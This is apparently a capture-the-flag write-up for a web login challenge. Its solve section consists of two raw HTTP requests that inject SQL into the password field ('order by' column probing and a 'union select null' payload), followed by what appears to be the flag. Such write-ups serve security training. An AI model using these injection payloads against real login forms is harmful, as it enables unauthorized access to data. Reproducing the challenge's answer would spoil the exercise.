**The Consortium** controls an access system that is believed to be impenetrable. Supposedly, no one can get in without the correct credentials. But you're a hacker, and you know that no system is truly impregnable.

The challenge lies before you: a simple login form. Can you find a way to bypass the protections and access the hidden data?

---

_**NOTE**: No other url is part of the challenge._

To access the challenge, click on the following link: [https://challenges.plumberion.click/system-access](https://challenges.plumberion.click/system-access)

## Solve

```
POST /system-access HTTP/2
Host: challenges.plumberion.click
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: https://challenges.plumberion.click
Referer: https://challenges.plumberion.click/system-access
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers

username=admin&password=admin'+order+by+3-- 
```

```
POST /system-access HTTP/2
Host: challenges.plumberion.click
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: https://challenges.plumberion.click
Referer: https://challenges.plumberion.click/system-access
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers

username=admin&password=admin'+union+select+null,null,null+-- 
```


```
H4345345C
```
